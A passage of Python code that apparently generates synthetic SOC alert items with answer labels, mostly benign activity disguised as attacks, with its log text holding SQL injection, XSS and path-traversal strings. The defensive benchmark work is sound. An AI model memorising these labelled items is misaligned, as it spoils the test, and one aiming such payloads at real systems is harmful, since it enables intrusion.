            f"msg='SQL Injection attempt'\n"
            f"{_ts()} web-prod-01 modsecurity[{_pid()}]: ALERT "
            f"src=10.0.7.50 uri=/../../etc/passwd "
            f"msg='Path traversal attempt'\n"
            f"{_ts()} firewall[{_pid()}]: src=10.0.7.50 "
            f"pentest_tag=APPROVED_PENTEST_2026Q1 "
            f"authorized_by=ciso@company.com"
        ),
        prompt="Investigate scanning and attack attempts from internal IP 10.0.7.50",
        src_ip="10.0.7.50", dst_ip="10.0.2.100", hostname="web-prod-01",
        verdict="false_positive",
        iocs=[],
        mitre=[],
        risk_range=[5, 25],
        difficulty="hard",
        notes="Authorized penetration test — source IP tagged as approved pentest in firewall",
        severity="low",
    ),
    # 4. Windows Update to CDN (looks like C2 beaconing)
    lambda: _make_alert(
        alert_type="c2_beacon",
        raw_log="\n".join([
            f"{_ts()} {_pick(HOSTNAMES)} proxy[{_pid()}]: CONNECT "
            f"download.windowsupdate.com:443 from {_pick(INTERNAL_IPS)}:{_high_port()} "
            f"-> 13.107.42.14:443 bytes_out=1024 bytes_in=52428800 "
            f"interval={_pick([3600, 7200, 14400])}s user-agent=WindowsUpdate/10.0"
            for _ in range(6)
        ]),
        prompt="Investigate periodic HTTPS connections to external IP with regular interval",
        src_ip=_pick(INTERNAL_IPS), dst_ip="13.107.42.14", hostname=_pick(HOSTNAMES),
        verdict="false_positive",
        iocs=[],
        mitre=[],
        risk_range=[0, 15],
        difficulty="medium",
        notes="Windows Update checking for patches — legitimate Microsoft CDN with standard user-agent",
        severity="informational",
    ),
    # 5. Vulnerability scanner (looks like brute force)
    lambda: _make_alert(
        alert_type="brute_force",
        raw_log="\n".join([
            f"{_ts()} {h} sshd[{_pid()}]: Failed password for {_pick(USERNAMES)} "
            f"from 10.0.7.50 port {_high_port()}"
            for h in _picks(HOSTNAMES, 5)
        ] + [
            f"{_ts()} monitoring-01 qualys[{_pid()}]: SCAN_COMPLETE "
            f"scanner=10.0.7.50 targets=5 vulns_found=12 "
            f"scan_profile=APPROVED_WEEKLY policy=PCI-DSS"
        ]),
        prompt="Analyze brute force attempts from 10.0.7.50 against multiple servers",
        src_ip="10.0.7.50", dst_ip=_pick(INTERNAL_IPS), hostname="monitoring-01",
        verdict="false_positive",
        iocs=[],
        mitre=[],
        risk_range=[5, 25],
        difficulty="hard",
        notes="Qualys vulnerability scanner running approved weekly scan — credential testing is part of scan profile",
        severity="low",
    ),
    # 6. Scheduled backup job (looks like data exfiltration)
    lambda: _make_alert(
        alert_type="data_exfiltration",
        raw_log=(
            f"{_ts(8)} backup-srv-01 rsync[{_pid()}]: "
            f"sending incremental file list to backup.company.com\n"
            f"{_ts(8)} backup-srv-01 rsync[{_pid()}]: "
            f"sent 2,147,483,648 bytes received 1,024 bytes "
            f"rate=50MB/s user=svc-backup\n"
            f"{_ts(8)} backup-srv-01 cron[{_pid()}]: "
            f"(svc-backup) CMD (/opt/scripts/nightly_backup.sh)\n"
            f"{_ts(8)} backup-srv-01 backup[{_pid()}]: "
            f"job=nightly_full status=success duration=1800s "
            f"destination=backup.company.com:/vault/2026-03-15"
        ),
        prompt="Investigate large data transfer (2GB) from backup server to external destination",
        src_ip="10.0.5.30", dst_ip="10.0.5.31", hostname="backup-srv-01",
        verdict="false_positive",
        iocs=[],
        mitre=[],
        risk_range=[0, 15],
        difficulty="medium",
        notes="Scheduled nightly backup via rsync to company backup server — normal operations",
        severity="informational",
    ),
    # 7. CI/CD pipeline deploying (looks like privilege escalation)
    lambda: _make_alert(
        alert_type="privilege_escalation",
        raw_log=(
            f"{_ts()} ci-runner-01 jenkins[{_pid()}]: "
            f"Build #4521 deploy-to-prod STARTED user=svc-jenkins\n"
            f"{_ts()} ci-runner-01 sudo[{_pid()}]: svc-jenkins : "
            f"TTY=unknown ; PWD=/var/lib/jenkins ; USER=root ; "
            f"COMMAND=/usr/bin/docker pull app:v2.1.0\n"
            f"{_ts()} web-prod-01 docker[{_pid()}]: "
            f"container app-prod created image=app:v2.1.0 "
            f"user=root\n"
            f"{_ts()} ci-runner-01 jenkins[{_pid()}]: "
            f"Build #4521 deploy-to-prod SUCCESS pipeline=main "
            f"approver=dave.wilson"
        ),
        prompt="Investigate sudo escalation to root by service account on CI server",
        src_ip="10.0.4.20", dst_ip="10.0.1.50", hostname="ci-runner-01",
        verdict="false_positive",
        iocs=[],
        mitre=[],
        risk_range=[0, 20],
        difficulty="hard",
        notes="CI/CD pipeline deploying approved build — sudo for docker pull is expected in deployment",
        severity="low",
    ),
    # 8. Health check monitoring (looks like port scanning)
    lambda: _make_alert(
        alert_type="reconnaissance",
        raw_log="\n".join([
            f"{_ts()} {h} nginx[{_pid()}]: "
            f"10.0.3.15 - - \"GET /health HTTP/1.1\" 200 15 "
            f"\"-\" \"Prometheus/2.45.0\""
            for h in _picks(HOSTNAMES, 8)
        ] + [
            f"{_ts()} monitoring-01 prometheus[{_pid()}]: "
            f"scrape targets=8 interval=15s all_up=true"
        ]),
        prompt="Investigate systematic connection attempts to multiple servers from 10.0.3.15",
        src_ip="10.0.3.15", dst_ip=_pick(INTERNAL_IPS), hostname="monitoring-01",
        verdict="false_positive",
        iocs=[],
        mitre=[],
        risk_range=[0, 10],
        difficulty="medium",
        notes="Prometheus health check scraping — connecting to /health on all monitored hosts every 15s",
        severity="informational",
    ),
    # 9. Software deployment via Ansible (looks like lateral movement)
    lambda: _make_alert(
        alert_type="lateral_movement",
        raw_log="\n".join([
            f"{_ts()} {h} sshd[{_pid()}]: Accepted publickey for svc-ansible "
            f"from 10.0.4.21 port {_high_port()}\n"
            f"{_ts()} {h} sudo[{_pid()}]: svc-ansible : "
            f"COMMAND=/usr/bin/apt-get update && apt-get upgrade -y"
            for h in _picks(HOSTNAMES, 6)
        ]),
        prompt="Investigate automated SSH logins from 10.0.4.21 to multiple hosts with sudo",
        src_ip="10.0.4.21", dst_ip=_pick(INTERNAL_IPS), hostname=_pick(HOSTNAMES),
        verdict="false_positive",
        iocs=[],
        mitre=[],
        risk_range=[0, 15],
        difficulty="medium",
        notes="Ansible configuration management running scheduled patching — SSH key auth + sudo is expected",
        severity="informational",
    ),
    # 10. Log aggregation (looks like data exfiltration)
    lambda: _make_alert(
        alert_type="data_exfiltration",
        raw_log=(
            f"{_ts()} elk-01 filebeat[{_pid()}]: "
            f"Harvester started for: /var/log/auth.log\n"
            f"{_ts()} elk-01 logstash[{_pid()}]: "
            f"pipeline.output.elasticsearch events=250000 "
            f"bytes=1073741824 rate=50MB/s\n"
            f"{_ts()} elk-01 elasticsearch[{_pid()}]: "
            f"index=logstash-2026.03.15 docs=250000 "
            f"size=1.5GB status=green"
        ),
        prompt="Investigate 1GB+ data transfer from multiple hosts to elk-01",
        src_ip=_pick(INTERNAL_IPS), dst_ip="10.0.3.16", hostname="elk-01",
        verdict="false_positive",
        iocs=[],
        mitre=[],
        risk_range=[0, 10],
        difficulty="easy",
        notes="ELK stack log aggregation — normal log pipeline ingesting from all hosts",
        severity="informational",
    ),
    # 11. Developer git push (looks like data exfiltration)
    lambda: _make_alert(
        alert_type="data_exfiltration",
        raw_log=(
            f"{_ts()} dev-ws-102 proxy[{_pid()}]: CONNECT github.com:443 "
            f"from 10.0.1.51:{_high_port()} user=bob.kumar\n"
            f"{_ts()} dev-ws-102 git[{_pid()}]: push origin main "
            f"objects=1247 size=85MB user=bob.kumar\n"
            f"{_ts()} dev-ws-102 dlp[{_pid()}]: WARN outbound_upload "
            f"user=bob.kumar destination=github.com size=85MB "
            f"protocol=HTTPS"
        ),
        prompt="Investigate large outbound data transfer to github.com by bob.kumar",
        src_ip="10.0.1.51", dst_ip="140.82.121.3", hostname="dev-ws-102",
        verdict="false_positive",
        iocs=[],
        mitre=[],
        risk_range=[0, 15],
        difficulty="medium",
        notes="Developer pushing code to company GitHub repository — DLP flagged due to size",
        severity="informational",
    ),
    # 12. SIEM correlation engine (looks like brute force)
    lambda: _make_alert(
        alert_type="brute_force",
        raw_log="\n".join([
            f"{_ts()} dc-01 security[{_pid()}]: 4625 "
            f"An account failed to logon. Subject: {_pick(USERNAMES)} "
            f"Logon Type: 3 Source: {_pick(INTERNAL_IPS)} "
            f"Failure Reason: Unknown user name or bad password"
            for _ in range(8)
        ] + [
            f"{_ts()} dc-01 security[{_pid()}]: 4624 "
            f"An account was successfully logged on. Subject: grace.taylor "
            f"Logon Type: 10 Source: 10.0.6.40"
        ]),
        prompt="Investigate multiple failed logon attempts against domain controller",
        src_ip="10.0.6.40", dst_ip="10.0.2.100", hostname="dc-01",
        verdict="false_positive",
        iocs=[],
        mitre=[],
        risk_range=[5, 25],
        difficulty="medium",
        notes="Users mistyping passwords on Monday morning — normal enterprise login pattern with eventual success",
        severity="low",
    ),
    # 13. Cloud sync client (looks like C2 beaconing)
    lambda: _make_alert(
        alert_type="c2_beacon",
        raw_log="\n".join([
            f"{_ts()} exec-laptop-01 proxy[{_pid()}]: CONNECT "
            f"onedrive.live.com:443 from 192.168.1.40:{_high_port()} "
            f"-> 52.96.108.18:443 bytes_out={random.randint(100,500)} "
            f"bytes_in={random.randint(100,500)} "
            f"interval=60s user-agent=OneDrive/24.0"
            for _ in range(10)
        ]),
        prompt="Investigate periodic beaconing to external IP with 60-second interval",
        src_ip="192.168.1.40", dst_ip="52.96.108.18", hostname="exec-laptop-01",
        verdict="false_positive",
        iocs=[],
        mitre=[],
        risk_range=[0, 15],
        difficulty="medium",
        notes="OneDrive sync client performing regular sync checks — standard Microsoft cloud service",
        severity="informational",
    ),
    # 14. Docker health checks (looks like port scanning)
    lambda: _make_alert(
        alert_type="reconnaissance",
        raw_log="\n".join([
            f"{_ts()} app-server-03 docker[{_pid()}]: healthcheck "
            f"container={c} status=healthy "
            f"cmd='curl -f http://localhost:{p}/health' exit=0"
            for c, p in [("api", 8090), ("worker", 8080), ("redis", 6379),
                         ("postgres", 5432), ("temporal", 7233)]
        ]),
        prompt="Investigate systematic port probing on app-server-03",
        src_ip="10.0.1.50", dst_ip="10.0.1.50", hostname="app-server-03",
        verdict="false_positive",
        iocs=[],
        mitre=[],
        risk_range=[0, 10],
        difficulty="easy",
        notes="Docker container health checks — localhost probes to standard service ports",
        severity="informational",
    ),
    # 15. VPN reconnect (looks like brute force)
    lambda: _make_alert(
        alert_type="brute_force",
        raw_log=(
            f"{_ts()} vpn-gw-01 openvpn[{_pid()}]: "
            f"TLS Error: TLS handshake failed user=carol.diaz "
            f"src=203.0.113.100\n"
            f"{_ts()} vpn-gw-01 openvpn[{_pid()}]: "
            f"TLS Error: TLS handshake failed user=carol.diaz "
            f"src=203.0.113.100\n"
            f"{_ts()} vpn-gw-01 openvpn[{_pid()}]: "
            f"TLS Error: TLS handshake failed user=carol.diaz "
            f"src=203.0.113.100\n"
            f"{_ts()} vpn-gw-01 openvpn[{_pid()}]: "
            f"Authenticated: carol.diaz src=203.0.113.100 "
            f"assigned_ip=10.0.8.15 certificate=valid"
        ),
        prompt="Investigate multiple VPN authentication failures from external IP",
        src_ip="203.0.113.100", dst_ip="10.0.5.30", hostname="vpn-gw-01",
        verdict="false_positive",
        iocs=[],
        mitre=[],
        risk_range=[0, 20],
        difficulty="medium",
        notes="VPN client reconnecting after network instability — TLS handshake retries before success",
        severity="low",
    ),
    # 16. Automated security scanning (looks like SQLi/XSS)
    lambda: _make_alert(
        alert_type="reconnaissance",
        raw_log=(
            f"{_ts()} web-prod-01 modsecurity[{_pid()}]: "
            f"src=10.0.7.50 method=GET "
            f"uri='/api/v1/users?id=1%20OR%201%3D1' "
            f"msg='SQL Injection' tag=OWASP_CRS/942\n"
            f"{_ts()} web-prod-01 modsecurity[{_pid()}]: "
            f"src=10.0.7.50 method=GET "
            f"uri='/search?q=%3Cscript%3Ealert(1)%3C/script%3E' "
            f"msg='XSS Attack' tag=OWASP_CRS/941\n"
            f"{_ts()} web-prod-01 burpsuite[{_pid()}]: "
            f"scan_type=DAST project=webapp-audit "
            f"scanner=10.0.7.50 authorized=true "
            f"jira=SEC-4521"
        ),
        prompt="Investigate SQL injection and XSS attempts against web-prod-01",
        src_ip="10.0.7.50", dst_ip="10.0.1.50", hostname="web-prod-01",
        verdict="false_positive",
        iocs=[],
        mitre=[],
        risk_range=[5, 25],
        difficulty="hard",
        notes="DAST scan via Burp Suite — authorized security testing with JIRA ticket reference",
        severity="low",
    ),
    # 17. NTP sync (looks like C2 beaconing)
    lambda: _make_alert(
        alert_type="c2_beacon",
        raw_log="\n".join([
            f"{_ts()} {_pick(HOSTNAMES)} ntpd[{_pid()}]: "
            f"synchronized to ntp.ubuntu.com ({_pick(LEGITIMATE_EXTERNAL_IPS)}) "
            f"stratum=2 offset=-0.{random.randint(1,99):02d}ms "
            f"interval=1024s"
            for _ in range(5)
        ]),
        prompt="Investigate periodic outbound connections with fixed interval to external IP",
        src_ip=_pick(INTERNAL_IPS), dst_ip=_pick(LEGITIMATE_EXTERNAL_IPS),
        hostname=_pick(HOSTNAMES),
        verdict="false_positive",
        iocs=[],
        mitre=[],
        risk_range=[0, 10],
        difficulty="easy",
        notes="NTP time synchronization — standard protocol with expected periodic behavior",
        severity="informational",
    ),
    # 18. Package manager updates (looks like C2 download)
    lambda: _make_alert(
        alert_type="malware",
        raw_log=(
            f"{_ts()} ci-runner-02 apt[{_pid()}]: "
            f"Fetched http://archive.ubuntu.com/ubuntu focal/main amd64 "
            f"Packages [1,275 kB]\n"
            f"{_ts()} ci-runner-02 apt[{_pid()}]: "
            f"Unpacking openssl (3.0.13-1) over (3.0.12-1)\n"
            f"{_ts()} ci-runner-02 dpkg[{_pid()}]: "
            f"installed openssl 3.0.13-1\n"
            f"{_ts()} ci-runner-02 cron[{_pid()}]: "
            f"(root) CMD (/usr/bin/unattended-upgrades)"
        ),
        prompt="Investigate software downloads and installations on ci-runner-02",
        src_ip="10.0.4.21", dst_ip="91.189.91.39", hostname="ci-runner-02",
        verdict="false_positive",
        iocs=[],
        mitre=[],
        risk_range=[0, 10],
        difficulty="easy",
        notes="Automated unattended-upgrades installing security patches from official Ubuntu repos",
        severity="informational",
    ),
    # 19. Service account password rotation (looks like credential stuffing)
    lambda: _make_alert(
        alert_type="brute_force",
        raw_log="\n".join([
            f"{_ts()} dc-01 security[{_pid()}]: 4723 "
            f"An attempt was made to change an account's password. "
            f"Target: {sa} Performer: svc-vault Source: 10.0.4.20"
            for sa in _picks(SERVICE_ACCOUNTS, 8)
        ] + [
            f"{_ts()} dc-01 vault[{_pid()}]: "
            f"password_rotation job=quarterly accounts=8 "
            f"policy=90day_rotation status=success"
        ]),
        prompt="Investigate mass password changes for service accounts from 10.0.4.20",
        src_ip="10.0.4.20", dst_ip="10.0.2.100", hostname="dc-01",
        verdict="false_positive",
        iocs=[],
        mitre=[],
        risk_range=[0, 20],
        difficulty="hard",
        notes="HashiCorp Vault rotating service account passwords per 90-day policy — scheduled job",
        severity="low",
    ),
    # 20. Load balancer health probes (looks like reconnaissance)
    lambda: _make_alert(
        alert_type="reconnaissance",
        raw_log="\n".join([
            f"{_ts()} {h} nginx[{_pid()}]: "
            f"10.0.3.15 - - \"GET /healthz HTTP/1.1\" 200 2 "
            f"\"-\" \"ELB-HealthChecker/2.0\""
            for h in _picks(HOSTNAMES, 10)
        ]),
        prompt="Investigate HTTP requests to /healthz on 10 hosts from 10.0.3.15",
        src_ip="10.0.3.15", dst_ip=_pick(INTERNAL_IPS), hostname=_pick(HOSTNAMES),
        verdict="false_positive",
        iocs=[],
        mitre=[],
        risk_range=[0, 10],
        difficulty="easy",
        notes="AWS ELB health checker probing application health endpoints — standard load balancer behavior",
        severity="informational",
    ),
]


def _gen_additional_fp(idx: int) -> dict:
    """Generate additional FP alerts beyond the template pool to reach 55 total."""
    variants = [
        # 21-25: Legitimate admin activities that look suspicious
        lambda: _make_alert(
            alert_type="privilege_escalation",
            raw_log=(
                f"{_ts()} dc-01 security[{_pid()}]: 4728 "
                f"A member was added to security-enabled global group. "
                f"Group: Remote Desktop Users Member: contractor-01 "
                f"Performer: netadmin\n"
                f"{_ts()} dc-01 security[{_pid()}]: 4720 "
                f"A user account was created. Account: contractor-01 "
                f"Creator: netadmin OU=Contractors\n"
                f"{_ts()} dc-01 ticketing[{_pid()}]: "
                f"JIRA IT-8832 'Onboard contractor for Q2 project' "
                f"approver=cto@company.com status=approved"
            ),
            prompt="Investigate new account creation with group membership changes",
            src_ip="10.0.2.100", dst_ip="10.0.2.100", hostname="dc-01",
            verdict="false_positive", iocs=[], mitre=[],
            risk_range=[5, 25], difficulty="hard",
            notes="IT admin onboarding contractor per approved JIRA ticket — normal provisioning workflow",
            severity="low",
        ),
        lambda: _make_alert(
            alert_type="defense_evasion",
            raw_log=(
                f"{_ts()} web-prod-02 sysmon[{_pid()}]: RegistryValueSet "
                f"user=svc-deploy process=ansible.exe "
                f"key=HKLM\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall "
                f"name=EnableFirewall value=0\n"
                f"{_ts()} web-prod-02 ansible[{_pid()}]: "
                f"TASK [deploy : disable firewall for blue-green switch] "
                f"changed=true playbook=deploy.yml\n"
                f"{_ts()} web-prod-02 ansible[{_pid()}]: "
                f"TASK [deploy : enable firewall after switch] "
                f"changed=true playbook=deploy.yml"
            ),
            prompt="Investigate firewall being disabled on production server",
            src_ip="10.0.4.21", dst_ip="10.0.1.51", hostname="web-prod-02",
            verdict="false_positive", iocs=[], mitre=[],
            risk_range=[5, 25], difficulty="hard",
            notes="Ansible playbook temporarily disabling firewall for blue-green deployment switch — re-enabled immediately",
            severity="low",
        ),
        lambda: _make_alert(
            alert_type="persistence",
            raw_log=(
                f"{_ts()} app-server-04 systemd[{_pid()}]: "
                f"Created symlink /etc/systemd/system/multi-user.target.wants/app.service\n"
                f"{_ts()} app-server-04 systemd[{_pid()}]: "
                f"Starting Application Service...\n"
                f"{_ts()} app-server-04 ansible[{_pid()}]: "
                f"TASK [app : enable service] changed=true "
                f"playbook=app-deploy.yml user=svc-ansible"
            ),
            prompt="Investigate new systemd service installation on app-server-04",
            src_ip="10.0.4.21", dst_ip="10.0.1.51", hostname="app-server-04",
            verdict="false_positive", iocs=[], mitre=[],
            risk_range=[0, 15], difficulty="medium",
            notes="Ansible deploying application as systemd service — standard deployment pattern",
            severity="informational",
        ),
        lambda: _make_alert(
            alert_type="malware",
            raw_log=(
                f"{_ts()} dev-ws-103 sysmon[{_pid()}]: ProcessCreate "
                f"user=dave.wilson parent=code.exe process=node.exe "
                f"cmdline='node --inspect=9229 server.js'\n"
                f"{_ts()} dev-ws-103 sysmon[{_pid()}]: NetworkConnect "
                f"process=node.exe src=10.0.1.51 dst=registry.npmjs.org:443\n"
                f"{_ts()} dev-ws-103 npm[{_pid()}]: "
                f"added 847 packages in 45s user=dave.wilson"
            ),
            prompt="Investigate suspicious process execution and network connections from dev workstation",
            src_ip="10.0.1.51", dst_ip="104.16.132.229", hostname="dev-ws-103",
            verdict="false_positive", iocs=[], mitre=[],
            risk_range=[0, 15], difficulty="medium",
            notes="Developer running Node.js app with debugger and installing npm packages — normal dev workflow",
            severity="informational",
        ),
        lambda: _make_alert(
            alert_type="c2_beacon",
            raw_log="\n".join([
                f"{_ts()} {_pick(HOSTNAMES)} telegraf[{_pid()}]: "
                f"output.influxdb: POST http://monitoring-01:8086/write "
                f"from {_pick(INTERNAL_IPS)} "
                f"points=500 interval=10s status=204"
                for _ in range(8)
            ]),
            prompt="Investigate regular outbound POST requests with 10-second interval",
            src_ip=_pick(INTERNAL_IPS), dst_ip="10.0.3.15", hostname=_pick(HOSTNAMES),
            verdict="false_positive", iocs=[], mitre=[],
            risk_range=[0, 10], difficulty="easy",
            notes="Telegraf metrics agent sending data to InfluxDB — standard monitoring infrastructure",
            severity="informational",
        ),
        # 26-30: More tricky FPs
        lambda: _make_alert(
            alert_type="data_exfiltration",
            raw_log=(
                f"{_ts()} file-server-01 smb[{_pid()}]: "
                f"COPY user=svc-backup src=\\\\file-server-01\\shares "
                f"dst=\\\\backup-srv-01\\vault size=50GB "
                f"files=12500 duration=3600s\n"
                f"{_ts()} file-server-01 windows[{_pid()}]: "
                f"Task Scheduler: Task '\\Microsoft\\Windows\\Backup\\Nightly' "
                f"completed status=0x0 user=SYSTEM"
            ),
            prompt="Investigate 50GB SMB file copy from file server to unknown destination",
            src_ip="10.0.5.30", dst_ip="10.0.5.31", hostname="file-server-01",
            verdict="false_positive", iocs=[], mitre=[],
            risk_range=[0, 15], difficulty="medium",
            notes="Windows Server Backup scheduled task copying to backup server via SMB — approved job",
            severity="informational",
        ),
        lambda: _make_alert(
            alert_type="lateral_movement",
            raw_log="\n".join([
                f"{_ts()} {h} sshd[{_pid()}]: Accepted publickey for svc-prometheus "
                f"from 10.0.3.15 port {_high_port()}"
                for h in _picks(HOSTNAMES, 5)
            ] + [
                f"{_ts()} monitoring-01 prometheus[{_pid()}]: "
                f"ssh_exporter: collected metrics from 5 hosts"
            ]),
            prompt="Investigate automated SSH connections from monitoring to multiple hosts",
            src_ip="10.0.3.15", dst_ip=_pick(INTERNAL_IPS), hostname="monitoring-01",
            verdict="false_positive", iocs=[], mitre=[],
            risk_range=[0, 15], difficulty="medium",
            notes="Prometheus SSH exporter collecting host metrics — service account with key auth",
            severity="informational",
        ),
        lambda: _make_alert(
            alert_type="brute_force",
            raw_log="\n".join([
                f"{_ts()} web-prod-01 nginx[{_pid()}]: "
                f"POST /api/v1/auth/login 401 {_pick(INTERNAL_IPS)} "
                f"user-agent='k6/0.45.0' body_bytes=45"
                for _ in range(50)
            ] + [
                f"{_ts()} ci-runner-01 k6[{_pid()}]: "
                f"load_test scenario=auth_stress vus=10 "
                f"iterations=50 status=completed pass_rate=0%"
            ]),
            prompt="Investigate 50 failed login attempts against API endpoint",
            src_ip="10.0.4.20", dst_ip="10.0.1.50", hostname="web-prod-01",
            verdict="false_positive", iocs=[], mitre=[],
            risk_range=[5, 25], difficulty="hard",
            notes="k6 load testing tool running auth stress test from CI runner — all 401s expected",
            severity="low",
        ),
        lambda: _make_alert(
            alert_type="phishing",
            raw_log=(
                f"{_ts()} mail-gw-01 postfix[{_pid()}]: "
                f"from=<noreply@docusign.com> to=<henry.anderson@company.com> "
                f"subject='Please review and sign: NDA Agreement' "
                f"dkim=pass spf=pass dmarc=pass\n"
                f"{_ts()} mail-gw-01 proxy[{_pid()}]: "
                f"henry.anderson@company.com clicked "
                f"https://app.docusign.com/documents/sign/abc123\n"
                f"{_ts()} mail-gw-01 dlp[{_pid()}]: "
                f"WARN external_link_click user=henry.anderson "
                f"url=docusign.com category=document_signing"
            ),
            prompt="Investigate potential phishing email with document signing link",
            src_ip="64.233.185.27", dst_ip="10.0.6.41", hostname="mail-gw-01",
            verdict="false_positive", iocs=[], mitre=[],
            risk_range=[0, 15], difficulty="medium",
            notes="Legitimate DocuSign email — DKIM/SPF/DMARC all pass, real docusign.com domain",
            severity="informational",
        ),
        lambda: _make_alert(
            alert_type="defense_evasion",
            raw_log=(
                f"{_ts()} db-master-01 postgres[{_pid()}]: "
                f"LOG: parameter 'log_statement' changed to 'none'\n"
                f"{_ts()} db-master-01 ansible[{_pid()}]: "
                f"TASK [postgres : tune logging for performance] "
                f"changed=true playbook=db-tune.yml\n"
                f"{_ts()} db-master-01 postgres[{_pid()}]: "
                f"LOG: parameter 'log_min_duration_statement' "
                f"changed to '1000'"
            ),
            prompt="Investigate database logging being disabled on production",
            src_ip="10.0.4.21", dst_ip="10.0.2.100", hostname="db-master-01",
            verdict="false_positive", iocs=[], mitre=[],
            risk_range=[5, 25], difficulty="hard",
            notes="DBA tuning PostgreSQL logging for performance — reducing verbose logging, keeping slow query log",
            severity="low",
        ),
        # 31-35: Edge case FPs
        lambda: _make_alert(
            alert_type="ransomware",
            raw_log="\n".join([
                f"{_ts()} file-server-01 sysmon[{_pid()}]: FileCreate "
                f"user=svc-backup process=7z.exe "
                f"file=D:\\Archives\\backup_2026_03_{i:02d}.7z.001"
                for i in range(1, 16)
            ] + [
                f"{_ts()} file-server-01 backup[{_pid()}]: "
                f"job=monthly_archive status=success "
                f"files=15 compression=7z encrypted=AES256 "
                f"schedule=monthly_first_saturday"
            ]),
            prompt="Investigate mass file encryption on file server using 7z",
            src_ip="10.0.5.30", dst_ip="10.0.5.30", hostname="file-server-01",
            verdict="false_positive", iocs=[], mitre=[],
            risk_range=[5, 25], difficulty="hard",
            notes="Monthly backup archival using 7-Zip with AES encryption — scheduled job, not ransomware",
            severity="low",
        ),
        lambda: _make_alert(
            alert_type="c2_beacon",
            raw_log="\n".join([
                f"{_ts()} analyst-ws-01 proxy[{_pid()}]: CONNECT "
                f"api.virustotal.com:443 from 192.168.1.10:{_high_port()} "
                f"bytes_out=64 bytes_in={random.randint(500, 5000)} "
                f"interval=300s user-agent=VT-API/3.0"
                for _ in range(8)
            ]),
            prompt="Investigate regular HTTPS beaconing to external API with 5-minute interval",
            src_ip="192.168.1.10", dst_ip="74.125.206.95", hostname="analyst-ws-01",
            verdict="false_positive", iocs=[], mitre=[],
            risk_range=[0, 15], difficulty="medium",
            notes="VirusTotal API integration polling for scan results — standard SOC tool",
            severity="informational",
        ),
        lambda: _make_alert(
            alert_type="privilege_escalation",
            raw_log=(
                f"{_ts()} app-server-03 sudo[{_pid()}]: "
                f"svc-deploy : TTY=unknown ; USER=root ; "
                f"COMMAND=/usr/bin/systemctl restart nginx\n"
                f"{_ts()} app-server-03 sudo[{_pid()}]: "
                f"svc-deploy : TTY=unknown ; USER=root ; "
                f"COMMAND=/usr/bin/systemctl restart app\n"
                f"{_ts()} ci-runner-01 jenkins[{_pid()}]: "
                f"Build #4588 service-restart SUCCESS "
                f"triggered_by=deployment pipeline=hotfix-2.1.1"
            ),
            prompt="Investigate sudo to root for service restarts on production",
            src_ip="10.0.4.20", dst_ip="10.0.1.50", hostname="app-server-03",
            verdict="false_positive", iocs=[], mitre=[],
            risk_range=[0, 15], difficulty="easy",
            notes="CI/CD pipeline restarting services after hotfix deployment — sudoers allows specific systemctl commands",
            severity="informational",
        ),
        lambda: _make_alert(
            alert_type="lateral_movement",
            raw_log=(
                f"{_ts()} bastion-01 sshd[{_pid()}]: "
                f"Accepted publickey for alice.chen from 203.0.113.100 "
                f"port {_high_port()}\n"
                f"{_ts()} bastion-01 sshd[{_pid()}]: "
                f"channel: TCP forwarding src=alice.chen "
                f"-> web-prod-01:22\n"
                f"{_ts()} web-prod-01 sshd[{_pid()}]: "
                f"Accepted publickey for alice.chen from 10.0.3.15 "
                f"port {_high_port()}\n"
                f"{_ts()} bastion-01 auth[{_pid()}]: "
                f"MFA verified for alice.chen method=TOTP"
            ),
            prompt="Investigate SSH hop through bastion to production server",
            src_ip="203.0.113.100", dst_ip="10.0.1.50", hostname="bastion-01",
            verdict="false_positive", iocs=[], mitre=[],
            risk_range=[0, 20], difficulty="medium",
            notes="Engineer using bastion host to access production — MFA verified, authorized SSH key",
            severity="low",
        ),
        lambda: _make_alert(
            alert_type="malware",
            raw_log=(
                f"{_ts()} dev-ws-101 antivirus[{_pid()}]: THREAT_DETECTED "
                f"file=C:\\Users\\alice.chen\\repos\\security-tools\\mimikatz.exe "
                f"threat=HackTool.Mimikatz user=alice.chen\n"
                f"{_ts()} dev-ws-101 antivirus[{_pid()}]: "
                f"action=quarantined "
                f"file=mimikatz.exe user=alice.chen\n"
                f"{_ts()} dev-ws-101 git[{_pid()}]: "
                f"clone https://github.com/security-team/pentest-tools "
                f"user=alice.chen branch=main"
            ),
            prompt="Investigate Mimikatz detection on developer workstation",
            src_ip="10.0.1.50", dst_ip="10.0.1.50", hostname="dev-ws-101",
            verdict="false_positive", iocs=[], mitre=[],
            risk_range=[5, 30], difficulty="hard",
            notes="Security researcher cloned internal pentest tools repo — AV quarantined tool, never executed",
            severity="low",
        ),
    ]
    return variants[idx % len(variants)]()


# ---------------------------------------------------------------------------
# SUSPICIOUS generators (50 alerts — ambiguous cases)
# ---------------------------------------------------------------------------

SUSPICIOUS_GENERATORS = [
    # 1. Internal port scan — could be IT audit or attacker recon
    lambda: _make_alert(
        alert_type="reconnaissance",
        raw_log="\n".join([
            f"{_ts()} firewall[{_pid()}]: DROP "
            f"src=10.0.6.40 dst={_pick(INTERNAL_IPS)} "
            f"proto=TCP dport={p} flags=SYN"
            for p in random.sample(range(1, 1024), 15)
        ]),
        prompt="Investigate port scanning activity from internal IP 10.0.6.40",
        src_ip="10.0.6.40", dst_ip=_pick(INTERNAL_IPS), hostname="firewall",
        verdict="suspicious", iocs=["10.0.6.40"], mitre=["T1046"],
        risk_range=[30, 60], difficulty="medium",
        notes="Port scan from internal IP — could be unauthorized IT audit or compromised workstation",
        severity="medium",
    ),
    # 2. Unusual DNS queries — not clearly malicious
    lambda: _make_alert(
        alert_type="c2_beacon",
        raw_log="\n".join([
            f"{_ts()} dns-01 dns[{_pid()}]: query "
            f"{_pick(['aaa','bbb','ccc','ddd'])}{random.randint(1,99)}.{_pick(['dynamic-dns.org','no-ip.com','duckdns.org'])} "
            f"A from {_pick(INTERNAL_IPS)}"
            for _ in range(8)
        ]),
        prompt="Investigate unusual DNS queries to dynamic DNS providers",
        src_ip=_pick(INTERNAL_IPS), dst_ip="10.0.2.100",
        hostname="dns-01",
        verdict="suspicious", iocs=[], mitre=["T1071"],
        risk_range=[25, 55], difficulty="medium",
        notes="DNS queries to dynamic DNS providers — could be developer home lab or C2 channel",
        severity="medium",
    ),
    # 3. New service account with elevated permissions
    lambda: _make_alert(
        alert_type="privilege_escalation",
        raw_log=(
            f"{_ts()} dc-01 security[{_pid()}]: 4720 "
            f"A user account was created. Account: svc-newapp "
            f"Creator: {_pick(USERNAMES)}\n"
            f"{_ts()} dc-01 security[{_pid()}]: 4728 "
            f"Member added to: Administrators "
